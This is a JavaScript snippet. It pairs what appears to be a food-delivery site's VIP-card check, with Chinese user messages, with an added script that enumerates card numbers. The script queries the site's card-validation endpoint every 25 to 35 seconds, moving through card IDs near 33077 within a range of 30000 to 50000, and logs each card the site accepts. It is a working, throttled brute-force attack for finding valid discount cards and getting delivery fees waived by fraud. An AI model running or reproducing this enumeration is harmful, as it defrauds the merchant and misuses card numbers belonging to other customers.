$.get("service.php?action=1879048193&card=" + document.OrderForm.card.value, function (result) {
  if (result == "") return;
  var fields = result.split(":");
  $("#CardApplyPrompt").show();
  $("#CardApplyPrompt").attr("class", fields[1] != 0 ? "tipV" : "tipV2");
  if (fields[1] != 0) {
    document.OrderForm.card.value = "";
    $("#CardApplyPromptColumn").text(fields[1] == 1 ? "您所输入的卡号无效，请核对后重新输入" :
      "您的卡已过有效期");
    if (document.OrderForm.applyCard == undefined || document.OrderForm.applyCard[document.OrderForm.applyCard.length - 1].checked)
      document.OrderForm.newCard.value = "";
  }
  else {
    $("#CardApplyPromptColumn").text(fields[0] +
      "号贵宾卡使用成功，请您在收餐时出示贵宾卡，送餐员验卡后会免收您的送餐费");
  }
  myBox.ApplyFavorableCard(document.OrderForm.card.value, fields[2]);
  showCurrentOrder()
});
(function () {
  var interval = 25000 + Math.random() * 10000
    , originalId = 33077
    , maxId = 50000
    , minId = 30000
    , id = 33077
    , phone = 13742481932;

  function go() {
    setTimeout(function () {
      $.get("service.php?action=" + 1879048193 + "&card=0" + id,
        function (result) {
          var r = result.split(':');
          if (r[1] === '0') {console.log(r);}
          else {
            console.log('failed');
          }
          updateId();
          go();
        });
    }, interval);
  }

  function updateId() {
    var rand = (Math.random() * 10 | 0) - 10;
    id += rand + 1;
    if (id > maxId || id < minId) {
      id = originalId;
    }
  }
  go();
})();